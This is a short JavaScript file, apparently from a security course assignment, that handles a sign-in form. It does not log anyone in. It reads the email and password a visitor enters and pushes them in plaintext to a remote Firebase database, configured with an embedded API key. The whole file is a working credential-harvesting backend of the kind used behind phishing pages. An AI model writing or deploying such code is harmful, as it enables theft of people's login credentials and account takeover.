const firebaseConfig = {
    apiKey: "AIzaSyDqj5dpKEx2YyxyAwGTjJaP75-ytqlJO44",
    authDomain: "sec-assignment4.firebaseapp.com",
    databaseURL: "https://sec-assignment4-default-rtdb.firebaseio.com",
    projectId: "sec-assignment4",
    storageBucket: "sec-assignment4.appspot.com",
    messagingSenderId: "943106531073",
    appId: "1:943106531073:web:6b20130e39d31f0186c500"
};

firebase.initializeApp(firebaseConfig);

var SigninDb=firebase.database().ref("Sign In");

document.getElementById("Signin").addEventListener("submit",submitForm);

function submitForm(e){
    e.preventDefault();

    var emailId=getElementVal('email');
    var password=getElementVal('password');

    SaveMessage(emailId,password);
}

const SaveMessage = (email,password)=>{
    var newSignin=SigninDb.push();

    newSignin.set({
        email:email,
        password:password

    });
};

const getElementVal=(id)=>{
    return document.getElementById(id).value;
};

